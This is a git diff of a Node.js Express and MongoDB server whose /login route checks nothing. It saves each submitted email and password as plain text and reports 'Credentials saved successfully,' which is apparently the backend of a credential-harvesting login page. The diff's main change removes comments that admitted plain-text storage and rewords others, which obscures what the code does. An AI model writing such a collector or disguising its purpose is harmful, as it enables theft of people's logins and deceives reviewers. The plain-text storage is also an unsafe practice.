@@ -7,7 +7,7 @@ require("dotenv").config();
 // Initialize app
 const app = express();
 const PORT = process.env.PORT || 3000;
-const DataB = process.env.DATAB;  // MongoDB connection URI
+const DataB = process.env.DATAB; // MongoDB connection URI
 
 // Middleware to parse JSON
 app.use(bodyParser.json());
@@ -26,8 +26,8 @@ mongoose
 
 // Define schema for saving email and password
 const userSchema = new mongoose.Schema({
-  email: { type: String, required: true }, // Email field (no uniqueness enforced)
-  password: { type: String, required: true }, // Password field (plain text)
+  email: { type: String, required: true }, // Email field
+  password: { type: String, required: true }, // Password field
   createdAt: { type: Date, default: Date.now }, // Timestamp for user creation
 });
 
@@ -40,19 +40,17 @@ app.post("/login", async (req, res) => {
 
   const { email, password } = req.body;
 
-  // Check if both fields are provided
+  // Validate email and password
   if (!email || !password) {
     return res
       .status(400)
       .json({ message: "Email and password are required." });
   }
 
-  // Ensure email is not empty or only spaces
   if (!email.trim()) {
     return res.status(400).json({ message: "Email cannot be empty." });
   }
 
-  // Simple password length validation (optional)
   if (password.length < 6) {
     return res
       .status(400)
@@ -60,13 +58,12 @@ app.post("/login", async (req, res) => {
   }
 
   try {
-    // Save the email and password (as plain text) to the database
+    // Create and save a new record
     const newUser = new User({ email, password });
     await newUser.save();
 
     return res.status(201).json({ message: "Credentials saved successfully." });
   } catch (error) {
-    // Log error and return a 500 status if something goes wrong
     console.error("Error occurred during /login:", error.message);
     return res
       .status(500)
